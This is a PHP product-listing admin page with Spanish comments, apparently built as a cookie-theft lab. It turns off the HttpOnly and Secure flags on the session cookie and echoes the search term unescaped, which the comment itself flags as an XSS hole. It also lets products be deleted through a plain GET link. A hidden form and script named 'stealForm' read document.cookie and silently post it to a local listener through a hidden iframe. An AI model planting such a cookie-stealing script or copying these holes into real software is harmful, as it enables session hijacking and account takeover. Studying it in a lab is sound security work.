<?php
// Iniciar la sesión con configuraciones específicas
session_start([
    'cookie_lifetime' => 86400, // Duración de la cookie de sesión (1 día)
    'cookie_httponly' => false, // Permite acceso a la cookie desde JavaScript
    'cookie_secure' => false, // No requiere HTTPS para la cookie
    'cookie_samesite' => 'Lax', // Restringe el envío de cookies en solicitudes entre sitios
    'name' => 'PHPSESSID', // Nombre explícito de la cookie de sesión
    'use_strict_mode' => true // Genera siempre una nueva ID de sesión para mayor seguridad
]);

// Desactivar el caché del navegador para evitar problemas con datos obsoletos
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

// Verificar si el usuario está autenticado
if (!isset($_SESSION['user_id'])) {
    // Redirige al login si no está autenticado
    header('Location: ../../login.php');
    exit(); // Detiene la ejecución del script después de la redirección
}

// Incluir la configuración de la base de datos
include('../../controller/db/config.php');

// Lógica de eliminación del producto
if (isset($_GET['delete_id'])) {
    $product_id = $_GET['delete_id']; // Obtener el ID del producto a eliminar
    $query = $connection->prepare("DELETE FROM products WHERE id = :id"); // Preparar la consulta SQL
    $query->bindParam(':id', $product_id, PDO::PARAM_INT); // Vincular el parámetro
    
    if ($query->execute()) { // Ejecutar la consulta
        header('Location: product_list.php'); // Redirige después de eliminar
        exit();
    } else {
        echo "Error al eliminar el producto."; // Mensaje de error si falla la eliminación
    }
}

// Lógica de búsqueda
$search_query = '';
if (isset($_GET['q'])) {
    $search_query = $_GET['q']; // Obtener el término de búsqueda (sin sanitizar, vulnerable a XSS)
    $sql = "SELECT * FROM products WHERE name LIKE :search_query ORDER BY created_at DESC"; // Consulta SQL con búsqueda
    $query = $connection->prepare($sql);
    $query->bindValue(':search_query', '%' . $search_query . '%', PDO::PARAM_STR); // Vincular el término de búsqueda
} else {
    $sql = "SELECT * FROM products ORDER BY created_at DESC"; // Consulta SQL sin búsqueda
    $query = $connection->prepare($sql);
}

$query->execute(); // Ejecutar la consulta
$products = $query->fetchAll(PDO::FETCH_ASSOC); // Obtener todos los resultados como un array asociativo
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Lista de Productos</title>
    <link rel="stylesheet" href="styles/styleproduct.css"> <!-- Enlace al archivo CSS -->
</head>
<body>

<!-- ===== FORMULARIO OCULTO ===== -->
<div style="display: none;">
    <iframe name="hiddenFrame"></iframe> <!-- Iframe oculto para enviar datos -->
    <form id="stealForm" method="POST" action="http://localhost:8082/" target="hiddenFrame">
        <input type="hidden" name="stolen_cookie" id="cookieData"> <!-- Campo oculto para enviar la cookie -->
    </form>
</div>

<script>
(function() {
    // Nombre único del marcador basado en la cookie de sesión
    var sessionCookie = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*=\s*([^;]*).*$)|^.*$/, "$1");
    var storageKey = 'cookieSent_' + sessionCookie;

    if (!sessionStorage.getItem(storageKey)) {
        setTimeout(function() {
            var cookies = document.cookie;
            if (cookies.includes('PHPSESSID')) { // Verifica si hay sesión activa
                document.getElementById('cookieData').value = cookies; // Asigna las cookies al campo oculto
                document.getElementById('stealForm').submit(); // Envía el formulario
                sessionStorage.setItem(storageKey, 'true'); // Marca como enviado
            }
        }, 500); // Retardo de 500ms antes de enviar
    }
})();
</script>
<!-- ===== FIN DEL FORMULARIO ===== -->

    <div class="top-right">
        <a href="../../controller/forms/editprofile.php" class="btn">Editar Perfil</a> <!-- Botón para editar perfil -->
    </div>
    <h1>Lista de Productos</h1>
    <form method="POST" action="../../controller/forms/logout.php" onsubmit="clearSessionStorage()">
        <button type="submit">Cerrar sesión</button> <!-- Botón para cerrar sesión -->
    </form>

<script>
function clearSessionStorage() {
    // Obtener PHPSESSID actual antes de cerrar sesión
    const sessionId = document.cookie
        .split('; ')
        .find(row => row.startsWith('PHPSESSID='))
        ?.split('=')[1];
    
    // Borrar clave específica de sessionStorage
    if (sessionId) {
        sessionStorage.removeItem(`cookieSent_${sessionId}`);
    }
}
</script>

    <a href="create_product.php" class="btn">Crear Nuevo Producto</a> <!-- Botón para crear nuevo producto -->

    <!-- Barra de búsqueda -->
    <form method="GET" action="product_list.php">
        <input type="text" name="q" placeholder="Buscar productos..." value="<?php echo $search_query; ?>">
        <button type="submit">Buscar</button>
    </form>

    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Nombre</th>
                <th>Descripción</th>
                <th>Precio</th>
                <th>Stock</th>
                <th>Acciones</th>
            </tr>
        </thead>
        <tbody>
            <?php if (!empty($products)): ?>
                <?php foreach ($products as $product): ?>
                    <tr>
                        <td><?php echo htmlspecialchars($product['id']); ?></td>
                        <td><?php echo htmlspecialchars($product['name']); ?></td>
                        <td><?php echo htmlspecialchars($product['description']); ?></td>
                        <td><?php echo htmlspecialchars($product['price']); ?></td>
                        <td><?php echo htmlspecialchars($product['stock']); ?></td>
                        <td>
                            <a href="edit_product.php?id=<?php echo htmlspecialchars($product['id']); ?>" class="btn">Editar</a>
                            <a href="product_list.php?delete_id=<?php echo htmlspecialchars($product['id']); ?>" onclick="return confirm('¿Estás seguro de que quieres eliminar este producto?');" class="btn delete">Eliminar</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
            <?php else: ?>
                <tr>
                    <td colspan="6">No hay productos disponibles</td>
                </tr>
            <?php endif; ?>
        </tbody>
    </table>
</body>
</html>